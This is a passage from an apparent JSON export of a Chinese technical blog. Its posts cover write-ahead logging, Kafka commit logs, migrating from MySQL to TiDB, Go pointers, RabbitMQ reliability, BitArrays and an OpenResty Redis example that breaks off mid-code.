设备并不是一个原子操作，如果客户端发送请求后，数据库服务端处理请求中，系统崩溃或宕机抑或重启，服务端·如何保证不丢失变更或者恢复到正确的数据？\n很久以前，存在着无原子性的非分布式数据库事务。张三账户有 1000 元，李四账户有 2000 元，张三向李四转账 200 元，数据库系统先将张三账户减少 200 元，然后将 800 元写回张三账户，接着将李四账户增加 200 元并且将 2200 元写回李四账户时，服务器突然发生故障；系统重启后，只有一个账户是对的，张三账户是 800 元，但是李四账户还是 2000 元，200 元不翼而飞。\n计算机界明显的坑早已被前人填满。Write-ahead logging 是数据库系统中提供原子性与持久性的技术（日志先行技术），简称 WAL，一言蔽之，数据库系统首先将数据变更记录到日志中，然后将日志写入稳定存储（如磁盘），之后才将变更写入数据库。\nRedo log 和 Undo log 是运用了 WAL 的磁盘数据结构：\n- Undo log 在崩溃恢复期间用于撤消或回滚未提交的事务。\n- Redo log 在崩溃恢复期间用于重做已提交但未将数据库对象从缓冲区刷入磁盘的事务。\n撤消和重做的前提是记录了数据库对象变更前的值和变更后的值。\n假设事务 T[i] 所操作的数据库对象是 X，X 的值从 V[old] 更改为 V[new]，将数据从缓冲区刷入磁盘的操作被称为 flush，那么 undo/redo log 日志记录形式如下：\n1 2 3 begin T[i] //（1） (T[i], X, V) //（2） commit T[i] //（3） （1）记录事务开始。\n（2）记录数据库对象的值。Undo log 记录 (T[i], X, V[old]) ，而 Redo log 记录 (T[i], X, V[new])，两者都要求 flush X 之前 flush (T[i], X, V)。\n（3）记录事务提交。Undo log 要求 flush X 之后 flush (commit T[i])，而 Redo log 要求 flush X 之前 flush (commit T[i])。\n在崩溃恢复期间，从数据库系统角度来看：\n若发现 undo log 缺少（3），则无法确定 flush X 是否完成。决定将 X 的值设为 V[old] 后 flush X，因为 X 变更前的值是 V[old]，即使恢复过程中又发生崩溃，重复将 X 的值设为 V[old] 仍然幂等，直到恢复完成后，可以在（3）位置写一条记录：rollback T[i]，下次恢复期间忽略。\n若发现 redo log 缺少（3），则确定 flush X 未执行。决定将 X 的值设为 V[new]，重试 flush X。\n若发现缺少（2），则忽略此事务（无计可施）。\n若没有（1），则无此事务。\n逻辑日志 前文MySQL 窘境 # 主从复制中提到其数据复制需要数据变更日志，或则数据变更日志记录（事件）。MySQL Server 有若干种日志，其中二进制日志（Binary log，简称 binlog）包含描述数据变更的“事件”，例如创建表或对表数据的更改，MySQL binlog 与存储引擎解耦。\n在服务化架构中，组合使用 MySQL 和 Elasticsearch 时常常要求将 MySQL 数据同步到 Elasticsearch；Elastic Stack 的解决方案是使用 Logstash 的插件：Jdbc input plugin。\nLogstash 的 Jdbc input plugin 会根据配置文件定时/定期对 MySQL 进行轮询，可获取上一次询问之后插入或更改的记录。有人误以为 Jdbc input plugin 最快只能每分钟查询一次，实际上也能设置秒级。\n监听 binlog 事件可以实现将 MySQL 数据同步到各种数据源，这种方案非常适合各种消息传递、数据流、实时数据处理。假设有一个中间件，根据 MySQL 协议，它只要向 MySQL master 注册为 MySQL slave，持续接收并解析 binlog 事件，经过处理后又能作为消息传递给各种服务或组件以满足数据同步需求；比如 alibaba/canal，它是一个关于 MySQL binlog 增量订阅\u0026amp;消费的组件。\n诸如此类的设计模式被称为 CDC（change data capture）。\n分布式系统日志 这要从状态机复制说起。如下图所示，每个 Server 存储了一个它的状态机（State Machine）按顺序执行的一系列命令的日志（Log）；每个日志包含相同顺序的命令集，因此每个状态机将执行相同的命令序列；因为讨论的状态机具有确定性，所以它们将产生相同的输出并以相同的状态结束。\n什么是确定性？给定特定的输入，将始终产生相同的输出。作为反面，执行类似以下命令的若干状态机（进程）将产生不同的输出并以不同的状态（磁盘和主存中的数据）结束。\n1 INSERT INTO t VALUES (NOW()); 状态机复制通常使用 replicated log 实现，保持 replicated log 的一致性是共识算法的工作。\n提交日志 Apache Kafka 分区（partition）的本质是提交日志（commit log）。\n如果把 Kafka 与关系型数据库作类比，那么消息（message）类比行（row），主题（topic）类比表（table）；一个主题分成多个分区，分区是追加式的消息序列，同一个主题的多个分区可以分布在不同机器上。\n从 Kafka 的角度来看，将消息写入分区就像将日志记录写入提交日志（追加式更新日志文件）。\n在 Kafka 的 server.properties 中，有一个 log.dirs 用于指定日志文件目录列表。\n1 2 # A comma separated list of directories under which to store log files log.dirs=/usr/local/var/lib/kafka-logs 在磁盘上，一个分区是一个目录，例如主题名为 quickstart-events 的一个分区：\n1 2 3 4 5 6 % tree /usr/local/var/lib/kafka-logs/quickstart-events-0/ /usr/local/var/lib/kafka-logs/quickstart-events-0/ ├── 00000000000000000000.index ├── 00000000000000000000.log ├── 00000000000000000000.timeindex └── leader-epoch-checkpoint 其中 index 文件与 log 文件合称为一个 segment，以人类可读的方式查看 log 文件：\n1 2 3 4 5 6 7 % kafka-run-class kafka.tools.DumpLogSegments --deep-iteration --print-data-log --files /usr/local/var/lib/kafka-logs/quickstart-events-0/00000000000000000000.log Dumping /usr/local/var/lib/kafka-logs/quickstart-events-0/00000000000000000000.log Starting offset: 0 baseOffset: 0 lastOffset: 0 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: 0 CreateTime: 1604900950169 size: 90 magic: 2 compresscodec: NONE crc: 3202290031 isvalid: true | offset: 0 CreateTime: 1604900950169 keysize: -1 valuesize: 22 sequence: -1 headerKeys: [] payload: This is my first event baseOffset: 1 lastOffset: 1 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: 90 CreateTime: 1604900955215 size: 91 magic: 2 compresscodec: NONE crc: 3852839661 isvalid: true | offset: 1 CreateTime: 1604900955215 keysize: -1 valuesize: 23 sequence: -1 headerKeys: [] payload: This is my second event 从中可以发现，消息编码在 log 文件中；index 文件则包含了偏移量（offset）与消息在 log 文件中的位置（position）的映射，用于查找消息。\n对于消息消费者组（consumer group）来说，从分区读取消息就像从提交日志读取记录；消费者组通过分区的偏移量区分已读消息和未读消息，消费者组对主题（Topic）的分区的偏移量存储在 Zookeeper 树或 Kafka 内置主题中。\n毫不夸张地说，Kafka 是一个分布式提交日志系统，只不过官方更愿意称之为分布式事件流平台。\n本文首发于 https://h2cone.github.io\n参考资料 The Log: What every software engineer should know about real-time data\u0026rsquo;s unifying abstraction\nWikipedia # Log file\nWikipedia # Write-ahead logging\nML Wiki # Undo/Redo Logging\nIntro to undo/redo logging\nRecovering from a system crash using undo/redo-log\nundo log 与 redo log 原理分析\nMySQL 5.7 Reference Manual # The Binary Log\nMySQL 5.7 Reference Manual # mysqlbinlog — Utility for Processing Binary Log Files\nMySQL 5.7 Reference Manual # Replication Formats\nHow to keep Elasticsearch synchronized with a relational database using Logstash and JDBC\nHow to sync your MySQL data to Elasticsearch\nThe Raft Consensus Algorithm\nHow Kafka’s Storage Internals Work\nDistributed Commit Logs with Apache Kafka\n","date":"2020-08-30T15:21:41+08:00","permalink":"https://h2cone.github.io/2020/08/30/log-notes/","title":"日志游记"},{"content":"MySQL 窘境 扩展 数据以前所未有的速度增长，例如从 GB 到 TB，甚至到 PB；负载增加，例如单位时间请求数、I/O 次数、活跃用户数激增；这可能引起单机 MySQL server 性能下降，甚至不可用。我们想尽办法扩展 MySQL，通常，要么采购更强大的机器作为数据库服务器，这是一种纵向扩展（scale up）；要么对 MySQL 的库或表进行分片（MySQL Sharding），即将数据集分离得到多个子数据集，任意两个子数据集可能存储在同一台机器上，也可能存储在不同机器上，这是一种横向扩展（scale out）。\n纵向扩展需要应对一些问题：\n成本增长过快。如果把一台机器的 CPU 核数增加一倍，主存和磁盘各扩容一倍，则最终总成本增加不止一倍。\n预见性能瓶颈。一台机器尽管拥有两倍的硬件指标但却不一定能处理两倍的负载。\n有限容错能力。显然无法提供异地容错能力。\n横向扩展一般不需要高端的硬件或机器，但需要多台一般的机器和应对分布式系统的许多挑战：\n故障与部分失效。\n不可靠的网络。\n不可靠的时钟。\n因为关心系统应对负载增加的能力（可扩展性），所以关心系统容错能力（可用性与一致性）。\n达成以上目标至少需要分区，对于 Elasticsearch 和 SolrCloud 以及 MongoDB 来说是 shard；对于 Cassandra 和 HBase 分别是 vnode 和 region。\n为什么分区 增强可扩展性。海量数据分布在更多磁盘上，查询负载分布到更多处理器上。\n分区容错。数据分区与数据复制通常结合使用，即每个分区在多个结点上存有副本（replica）。\n副本的优势：\n容错。容忍结点失效，支持故障转移。\n横向扩展。采用多结点来处理更多的请求。\n就近访问。将副本部署到距离用户更近的地方。\nPartitioning 项目开始初期，什么情况下适合对 MySQL 分库分表？阿里巴巴 Java 开发手册在“MySQL 数据库“章节中有一则推荐，仅供参考：\n【推荐】单表行数超过 500 万行或者单表容量超过 2 GB，才推荐进行分库分表。 说明：如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。\n我们通常使用垂直分区（vertical partitioning）和水平分区（horizontal partitioning），如下图所示：\nVP1 和 VP2 表现得像两张可通过 ID 关联起来的表，HP1 和 HP2 的 scheme 和列（columns）相同，但行（rows）不同。行的增长速度通常快于列的增长速度，我们更关注水平分区，数据库分片是数据库或搜索引擎的水平分区；但新问题随之而来：假设 HP1、HP2、HP3、HP4\u0026hellip;\u0026hellip; 包含了多张表的数据，且由多个 MySQL server 维护，如果客户端要查找满足给定条件的一行或多行记录，那么它应该向哪个或哪些 MySQL server 发起请求？如何合并多个结点返回的结果集？如何执行跨分区 JOIN、排序、分页、分组等操作？如何保证分布式事务？\n在以前，上面问题的解决方案常常是数据库中间件，数据库中间件的设计模式至少有两种，Proxy 和 Smart Client。Proxy 是应用程序与数据库集群的中间层，它对客户端制造了单一数据库实例的假象，客户端发送到 Proxy 的请求将由 Proxy 分发给下层的数据库服务器；Smart Client 是与应用程序集成的库或框架，客户端向数据库集群发起的请求将由客户端路由。两者的图像可参考代理分发和客户端路由。\n目前，开源且较活跃的数据库中间件有 ShardingSphere、MyCAT、vitess 等等，一直以来勉强可用，但是前两者的缺点也不容忽视：\n侵入性。要求用户指定 shard key 和其它分片配置；如果原业务逻辑包含 JOIN、subquery 等复杂 SQL，改动工作量可能难以估计。\n不支持透明分片。维护分片或集群的代价随着结点的增多而非线性增长。\n暂不支持弹性伸缩。据说都还在开发中。\n复杂查询优化能力较弱。不能生成最优的执行计划（plan），许多优化工作推卸给应用程序。\n如何将原始表（orginal table）的记录分配给多个 MySQL server（实例、进程）？数据库中间件是应用程序级别的实现，MySQL Cluster 则是数据库级别的实现，它声称支持跨结点自动分片（分区），可是它是通过 NDB 存储引擎实现的，不温不火。\n主从复制 MySQL 的数据复制模型是主从复制。传统主从复制图像：主结点（主副本、主库）处理读/写请求，若是写请求则通过同步复制或异步复制将数据变更日志（事件或日志记录）发送到所有从结点（从副本、从库），从结点按照日志（日志记录或事件）写副本；一般情况，从结点只读，故障转移时从结点可提升为主结点。传统的同步复制侧重一致性，要求”短暂“的不可用，主结点需要等待从结点的确认；传统的异步复制侧重可用性，要求“短暂”的不一致，从结点滞后于主结点。\n如果把所有从结点配置为同步复制模式，那么任何失效或性能下降的从结点会导致系统阻塞。MySQL 支持设置半同步模式，某一个从结点配置为同步模式，其它从结点配置为异步模式；当同步模式的从结点失效时，另一个从结点从异步模式提升为同步模式，这么做的好处之一是保证至少有两个结点（主结点和同步模式的从结点）拥有最新的数据副本。半同步并非高枕无忧，微信后台团队在 MySQL 半同步复制的数据一致性探讨中总结了 MySQL 的半同步复制和 Master 切换都存在一些不足，数据复制存在回滚难题，Master 切换存在多 Master 难题。\n主从复制模型不能保证同时满足强一致性和高可用性。如果出现结点失效、网络中断、延迟抖动等情况，多主结点复制方案会更加可靠，但是代价则是系统的高复杂度和弱一致性保证。多主结点复制适用于多数据中心，每个数据中心采用常规的主从复制方案，各个数据中心的主结点负责与其它数据中心的主结点交换 replicated log。\n小结 面对透明分片（transparent sharding）、弹性伸缩（auto-scaling）、自动恢复（auto-failover）、异地多活（multi-data center）～等需求，传统的解决方案使我们陷入窘境。\nSQL 和 NoSQL ACID 和 BASE 为什么不使用 NoSQL 数据库代替 MySQL 数据库呢？假设我们有了大刀阔斧迁移数据和重写应用程序的决心（基本不可能），但是许多 NoSQL 数据库都牺牲了一致性，而倾向于可用性，这种一致性模型往往被称为 BASE：\n基本可用性（Basically Available）。\n软状态（Soft state）。类似中间状态。\n最终一致性（Eventual consistency）。\nBASE 模凌两可，太长或永远不一致的系统基本不可用。许多处理重要数据的系统（例如，财务、订单、互联网金融系统等）随着快速增长的数据和负载，常规的关系数据库扩展困难，而对于 ACID ，特别是一致性的要求，NoSQL 数据库难以满足。相较于 BASE 的承诺，关系数据库的 ACID 的承诺是五十步笑百步（一致性往往推卸给应用程序）：\n原子性（Atomicity）。事务中的操作序列，要么全部执行成功（提交），要么全部不执行（回滚）。\n一致性（Consistency）。不蕴含矛盾，逻辑自洽\u0026hellip;\u0026hellip;\n隔离性（Isolation）。同时运行的事务不应相互干扰，事务提交时，其结果与串行执行完全相同。\n持久性（Durability）。无完美或绝对的保证。\n数据模型与查询语言 NoSQL 数据库缺乏 JOIN 的能力，这是其文档模型的限制。关系数据库市场占有率一直居高不下，参考 DB-Engines Ranking，原因之一是 SQL（DDL、DML、DQL、DCL） 是声明式语言的代表，它的简单与统一在于指定结果所满足的模式，在不改变语句的前提下，查询优化器或底层引擎的迭代更新就有可能显著提高性能。\nSQL 的关系模型理论足够优雅：\n关系是笛卡尔积的一个子集。\n关系（表）是元组（行）的集合。\n关系（表）经过运算以后，如 SELECT、JOIN、WHERE、交、并、差（关系代数），结果还是一个关系（表）。\n近年来，流行开源组件提供类 SQL 的趋势越来越明显，例如 Spark SQL、KSQL、Flink SQL、ClickHouse SQL\u0026hellip;\nNewSQL 新在哪 NewSQL 是一类关系数据库系统，旨在为 OLTP 提供 NoSQL 数据库系统的可扩展性，同时提供传统关系数据库系统的 ACID 保证。OLTP 与 OLAP 有时区分并不是那么明显，前者侧重 T（事务），后者侧重 A（分析）：\nNewSQL 数据库系统新在架构、存储引擎、共识算法。\n你好 TiDB TiDB 项目受到了 Spanner/F1 与 Raft 的启发，TiKV 对应的是 Spanner，TiDB 对应的是 F1，详情请看 TiDB 整体架构、TiDB 数据库的存储、TiDB 数据库的计算、调度概述\u0026hellip;\u0026hellip;\nSQL Layer 无状态，可以通过负载均衡组件（如 LVS、HAProxy、F5）对外提供统一的接入地址。\n1 tiup playground v4.0.0 --db 3 --kv 4 --pd 3 --monitor 如上所示，使用 tiup 启动了 3 个 TiDB 实例和 4 个 TiKV 实例以及 3 个 PD 实例。\n1 2 3 4 5 6 7 8 9 10 Waiting for tikv 127.0.0.1:20160 ready Waiting for tikv 127.0.0.1:20161 ready Waiting for tikv 127.0.0.1:20162 ready Waiting for tikv 127.0.0.1:20163 ready CLUSTER START SUCCESSFULLY, Enjoy it ^-^ To connect TiDB: mysql --host 127.0.0.1 --port 4000 -u root To connect TiDB: mysql --host 127.0.0.1 --port 4001 -u root To connect TiDB: mysql --host 127.0.0.1 --port 4002 -u root To view the dashboard: http://127.0.0.1:2379/dashboard To view the monitor: http://127.0.0.1:9090 TiDB 非常友好地兼容了 MySQL 5.7 协议，从 MySQL 迁移到 TiDB 对应用程序无限接近零侵入。这里我们可以通过 MySQL 命令行工具连接某一个 TiDB 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 % mysql --host 127.0.0.1 --port 4000 -u root Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 5 Server version: 5.7.25-TiDB-v4.0.0 TiDB Server (Apache License 2.0) Community Edition, MySQL 5.7 compatible Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | INFORMATION_SCHEMA | | METRICS_SCHEMA | | PERFORMANCE_SCHEMA | | mysql | | test | +--------------------+ 5 rows in set (0.00 sec) 导入样本数据集到某一个 TiDB 实例，样本数据集的 database 名称为 employees。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 % mysql --host 127.0.0.1 --port 4001 -u root \u0026lt; employees.sql INFO CREATING DATABASE STRUCTURE INFO storage engine: InnoDB INFO LOADING departments INFO LOADING employees INFO LOADING dept_emp INFO LOADING dept_manager INFO LOADING titles INFO LOADING salaries data_load_time_diff NULL 我们会发现，连接任意一个 TiDB 实例都能观察到 employees 库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql\u0026gt; show tables from employees; +----------------------+ | Tables_in_employees | +----------------------+ | current_dept_emp | | departments | | dept_emp | | dept_emp_latest_date | | dept_manager | | employees | | salaries | | titles | +----------------------+ 8 rows in set (0.00 sec) TiKV 数据分区的术语是 Region，使用 Raft 对写入数据在多个 TiKV 结点（实例）之间自动分片和复制日志，每个 Region 的所有副本（默认为三副本）组成一个 Raft Group，每个 TiKV 实例（结点）负责多个 Region。\n同城多数据中心部署和两地三中心部署则提供了更强大的容错（容灾）能力。\n本文首发于 https://h2cone.github.io\n参考资料 Designing Data-Intensive Applications\nUnderstanding Database Sharding\n“分库分表\u0026quot; ？选型和流程要慎重，否则会失控\nMySQL 5.7 Reference Manual # Replication Implementation\nSQL vs NoSQL: What\u0026rsquo;s the difference?\nWiki # NewSQL\nShared-nothing architecture\n演讲实录|黄东旭：分布式数据库模式与反模式\nHow do we build TiDB\nPingCAP blog\nTiDB 数据库快速上手指南\nPingCAP docs\n","date":"2020-07-11T11:21:03+08:00","permalink":"https://h2cone.github.io/2020/07/11/from-mysql-to-tidb/","title":"从 MySQL 到 TiDB"},{"content":"关键 变量是包含值的存储。 指针的值是变量的地址。 Go 语言的变量都拥有地址，而指针是一个变量，它的值是另外一个变量的地址。当我们说整型指针时，我们指的是一类型的指针。考虑下面的代码片段：\n1 2 3 4 5 x := 1 p := \u0026amp;x // p, 类型 *int, 指向 x fmt.Println(*p) // \u0026#34;1\u0026#34; *p = 2 // 相当于 x = 2 fmt.Println(x) // \u0026#34;2\u0026#34; 操作符 \u0026amp; 作用于变量 x，产生了指针 p，p 的类型是 *int，可以发现其中 int 就是 x 的类型；操作符 * 作用于 p，检索了 p 指向的变量 x，能够读写 x 的值，但是这到底是什么意思？下图是一个很好的类比：\n左边为变量，中间为地址 （试着打印一下 p），右边为值。当执行了 p := \u0026amp;x 后，*p 是 x 的别名，故赋新值给 *p 也就更改了 x 的值。为什么指针还需要绑定类型？出于类型安全考虑，如果把上面代码的 *p = 2 替换成 *p = \u0026quot;two\u0026quot;，那么编译不通过。\n畅想 Go 函数调用的参数传递是值传递，值可能是地址，拷贝地址往往更高效，且能操纵指向的变量的值或引用的数据结构。 Java 把指针 （Pointer）伪装成引用（Reference），创建一个对象，则产生了这个对象的引用。 Java 方法调用的参数传递估计是值传递，只不过原始类型 （primitive type）赋予的是原值而引用类型 （reference type）赋予的是地址。 本文首发于 https://h2cone.github.io\n","date":"2020-06-21T11:11:59+08:00","permalink":"https://h2cone.github.io/2020/06/21/go-pointer/","title":"Go 指针要点"},{"content":"图片来自网络 本文首发于 https://h2cone.github.io\n","date":"2020-06-04T00:00:24+08:00","permalink":"https://h2cone.github.io/2020/06/04/goodbye-spring/","title":"Goodbye Spring"},{"content":"高级消息队列协议 众所周知，RabbitMQ 实现了 AMQP（Advanced Message Queuing Protocol），准确来说是 AMQP 0-9-1；AMQP 是一种使符合要求的客户端可以与符合要求的消息代理（message broker）进行通信的一种消息传递协议，它的概念如下图所示：\n生产者（producer）发布消息，消费者（consumer）消耗消息。生产者或发布者（publisher）通常无需关心以下几点：\n消息将发送到哪些队列（queue）。\n消息（message）被哪些消费者消费。\nExchange 接收生产者发布的消息并路由到队列，exchange 根据什么转发消息到队列？人类可以使用绑定（binding）来定义 queue 和 exchange 的关系以及提供消息路由规则。生产者只面向 exchange 发布消息，而消费者只面向 queue 消耗消息，因此常说 RabbitMQ 解耦生产者和消费者。\n值得一提的是，单独的 MySQL server 可以创建多个数据库；与此类似，单独的 RabbitMQ server 可以创建多个虚拟主机（virtual host）。虚拟主机包含 queues 和 exchanges 以及 bindings，虚拟主机之间可相互隔离。\nExchange 当成功安装了 RabbitMQ 并正常启动后，可以通过后台管理界面去直观认识这种消息代理，不难发现 RabbitMQ 提供了 4 种 exchange 类型：\nExchange 使用的路由算法取决于 exchange 类型和 binding 规则。\nDirect exchange 如果一个 exchange 的类型是 direct，将一个 queue 绑定到该 exchange 时，要求附加一个名为 routing key 的参数；当一个携带 routing key 的消息到达该 exchange 时，该 exchange 将转发消息到相应的 queue（精确匹配 routing key）。\nFonout exchange 类型为 fonout 的一个 exchange 忽略 routing key，将消息广播到所有与该 exhange 绑定的 queue。\nTopic exchange 它与 direct exchange 类似，绑定时要求设置 routing key，不同在于路由时 topic exchange 支持模糊匹配或正则表达式匹配 routing key。\nHeaders exchange 它忽略 routing key，路由是根据消息中的 header 和绑定时设置的 argument。\n可靠的消息传递 即使 TCP 确认一个数据包已经发送到目标结点，但应用程序也可能在处理完成之前发生崩愤。如果你想知道一个请求是否执行成功，就需要应用级别的回复。\n所谓可靠的消息传递，参考底层 TCP 可靠传输的基本思想，应用层的 RabbitMQ 是否也有确认、超时、重传等概念？\n确认与回执 Publisher confirms 允许消息代理向发布者表明消息已收到或已处理，Consumer acknowledgements 允许消费者向消息代理表明消息已收到或已处理。Acknowledgement 即是回执，简称 ack，消息代理的 ack 就是 publisher confirms，消费者的 ack 就是 consumer acknowledgements。使用发布者确认或消费者回执至少可以保证一次消息传递不丢失消息，建议关闭自动 ack 或开启手动模式。\nPublisher confirms 1 2 3 4 5 6 7 8 Channel channel = connection.createChannel(); channel.confirmSelect(); channel.addConfirmListener((deliveryTag, multiple) -\u0026gt; { // code when message is confirmed }, (deliveryTag, multiple) -\u0026gt; { // code when message is nack-ed }); 对于 Java 客户端而言，可以异步处理 publisher confirms，一是消息代理已收到消息或已处理消息的客户端回调方法；二是消息代理未收到消息或已丢失消息的客户端回调方法，丢失的消息仍可能传递到消费者，但是消息代理没法保证这一点。long deliveryTag 是在一个 Channel 中一次消息传递的标示符，它是单调递增的正整数；boolean multiple 为 true 则表示当前和 deliveryTag 之前的消息已收到或已处理。对于无法路由的消息，消息代理虽然也会回复（返回空队列列表），但是默认情况下无法路由的消息会被丢弃，除非发布消息时将 boolean mandatory 设为 true 或使用 alternate exchange 来备份。\n1 2 3 4 channel.addReturnListener(returnMessage -\u0026gt; { // to be notified of failed deliveries // when basicPublish is called with \u0026#34;mandatory\u0026#34; or \u0026#34;immediate\u0026#34; flags set }); Consumer acknowledgements 1 2 3 4 5 6 7 8 // this example assumes an existing channel instance // 确认，ack \u0026gt; 0 channel.basicAck(deliveryTag, multiple); // 否认，ack \u0026lt; 0 channel.basicNack(deliveryTag, multiple, requeue); // 拒绝，ack \u0026lt; 0 channel.basicReject(deliveryTag, requeue) 消费者的回执可以是确认、否认、拒绝。不管是否认还是拒绝，如果 boolean requeue 为 false 则相应的消息将被消息代理丢弃，设为 true 则相应的消息将重新加入消息代理的队列，从而允许其它消费者消费；boolean multiple 为 true 表示否认或拒绝当前和 deliveryTag 之前的消息。确认则表示相应的消息已收到或已处理，消息代理将记录已推送的消息，也可以将其丢弃。如果消费者投递给消息代理的 ack 丢失了会发生什么？消息代理将重发。\nAMQP 事务 RabbitMQ 事务将可能大幅降低吞吐量，故一般不推荐使用。\nUsing standard AMQP 0-9-1, the only way to guarantee that a message isn\u0026rsquo;t lost is by using transactions \u0026ndash; make the channel transactional then for each message or set of messages publish, commit. In this case, transactions are unnecessarily heavyweight and decrease throughput by a factor of 250. To remedy this, a confirmation mechanism was introduced. It mimics the consumer acknowledgements mechanism already present in the protocol.\n集群 旧文提到过软件系统三大目标，首先，RabbitMQ 集群如何保证可靠性？RabbitMQ 集群是一个或多个结点的逻辑分组，每个结点共享 exchanges、bindings、queues、virtual hosts、users（RabbitMQ 有 RBAC 特性）、runtime parameters 等运行时状态，且结点对等（P2P）。对于客户端来说，集群中的每个结点都可以绑定、发布、删除连接到首个结点时创建的 exchange。\nRabbitMQ 集群提供了创建高可用队列（HA queues）的方法来支持容错（fault tolerance）。高可用队列横跨多个集群结点并共享同步的队列状态，包括消息数据。任何具有高可用队列的结点发生故障，群集中的其它结点仍将包含消息和队列状态；当故障结点恢复并重新加入集群时，它将同步它下线时错过的消息。\n本文首发于 https://h2cone.github.io\n参考资料 AMQP 0-9-1 Model Explained\nMessageing using AMQP\nRabbitMQ # Consumer Acknowledgements and Publisher Confirms\nRabbitMQ # Tutorials # Publisher Confirms\nrabbitmq 重复确认导致消息丢失\nRabbitMQ # Reliability Guide\nRabbitMQ # Clustering Guide\nRabbitMQ # Cluster Formation and Peer Discovery\nharbur/docker-rabbitmq-cluster\nRabbitMQ in Depth # Chapter 7. Scaling RabbitMQ with clusters\n","date":"2020-05-04T11:54:46+08:00","permalink":"https://h2cone.github.io/2020/05/04/rabbitmq-reliability/","title":"RabbitMQ 的可靠性"},{"content":"纸上谈兵 有两个 1GB 的文本文件，文件内容是无序数组（一行一个整数，一个文件中大概有一亿个非负整数，同一个文件中不重复），请在内存使用尽可能少的情况下将只在其中一个文件出现过的数字找出来。\n应用 BitArray。逐行读取 2 个文件的整数并分别映射到 2 个 BitArray，其中每个 BitArray 的长度为 1 亿，即 100000000 bit = 11.92093 MB，求这两个 BitArray 的对称差。\n映射。将文件中的非负整数映射为下标（索引），比如给定 {1, 5} 和 {1, 2} 这两个整数集，则相应的 BitArray 分别形如：\n00\u0026hellip;100010\n00\u0026hellip;000110\nBit array 每位初始值位 0，设置为 1 则表示该位的下标（index）为相应的整数，右边第一位下标为 0，从右到左单调递增，增量为 1。\n对称差。两个集合的对称差是属于一个集合而不属于另一个集合的元素组成的集合。比如 {1, 5} 与 {1, 2} 的对称差为 {2, 5}，相应的 BitArray 运算形如：\n00\u0026hellip;100010 ^ 00\u0026hellip;000110 -\u0026gt; 00\u0026hellip;100100\n本文首发于 https://h2cone.github.io\n","date":"2020-04-23T17:40:57+08:00","permalink":"https://h2cone.github.io/2020/04/23/bit-array-0/","title":"初识 BitArray"},{"content":"Nginx Nginx 是高性能的负载均衡器、Web 服务器、反向代理服务器。它是我们既熟悉又陌生的老朋友，经常依靠它水平扩展应用程序、部署前端应用程序、代理应用程序、构建 API 网关等，Nginx 由纯 C 语言实现，但却非常易于使用。\n早在 2005 年，官方博客用一篇标题为 Inside NGINX: How We Designed for Performance \u0026amp; Scale 的文章描述了 Nginx 的架构：\nNginx 如何创建进程以有效利用资源。\n使用状态机来管理流量（traffic）。\n非阻塞和事件驱动的架构使 Nginx 可以同时调度多个状态机。\n进程架构如何支持不间断的优雅更新和二进制升级。\nOpenResty 不妨先看看 OpenResty 官方的宣传语。\nOpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。\n比起使用 C 语言，使用 Lua 门槛要稍低一些，而且有 LuaJIT 的性能优化。\nOpenResty® 通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。\n对于基于 I/O 多路复用（请见网络·NIO # I/O 模型）的 Nginx 来说，单机 C1000K 不在话下，反而是受限于操作系统或配置。\nOpenResty® 的目标是让你的 Web 服务直接跑在 Nginx 服务内部，充分利用 Nginx 的非阻塞 I/O 模型，不仅仅对 HTTP 客户端请求，甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及 Redis 等都进行一致的高性能响应。\n既然支持访问多种数据库，则足矣处理复杂的业务逻辑。\n接下来，以一个名为 openresty-exp/redis-example 的例子来初步体验 OpenResty。\n1 2 3 4 5 6 . ├── RedisExample.lua ├── conf │ └── nginx.conf ├── logs │ └── error.log 首先新建配置文件目录（conf）和日志文件目录（logs），然后编写 Nginx 配置文件（nginx.conf）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 worker_processes 1; error_log logs/error.log; events { worker_connections 1024; } http { server { listen 80; location ~ /redis/(.+)/(.+) { charset utf-8; lua_code_cache on; content_by_lua_file RedisExample.lua; } } } Nginx http server 监听 80 端口，为了方便展示，匹配的请求 URL 包含两个路径参数。Nginx 处理 HTTP 请求分成了若干阶段，详情请见 Nginx # http phases，或则直接参考 OpenResty # 执行阶段概念，这里只关心正常生成响应的阶段（content）并使用 Lua 脚本处理业务逻辑。\n假设 HTTP 客户端发送包含键值对的请求到 Nginx server，Nginx server 先将键值对插入 Redis 实例，然后再从 Redis 实例查询相应的键所对应的值，最后发送包含键值对的响应到 HTTP 客户端。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 local json = require \u0026#34;cjson\u0026#34; local redis = require \u0026#34;resty.redis\u0026#34; local red = redis.new() red:set_timeouts(1000, 1000, 1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;failed to connect: \u0026#34;, err) return end local key = ngx.var[1] local val = ngx.var[2] local ok, err = red:set(key, val) if not ok then ngx.say(\u0026#34;failed to set: \u0026#34;, err) return end local val, err = red:get(key) if not val then ngx.say(\u0026#34;failed to get: 